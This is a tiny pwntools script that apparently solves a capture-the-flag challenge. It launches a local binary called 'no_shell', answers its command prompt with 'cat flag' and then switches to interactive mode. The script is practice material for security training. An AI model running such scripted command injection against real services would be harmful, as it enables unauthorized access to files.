from pwn import *

r = process('./no_shell')

r.recvuntil(b'Enter a command: ')

r.sendline(b'cat flag')
r.interactive()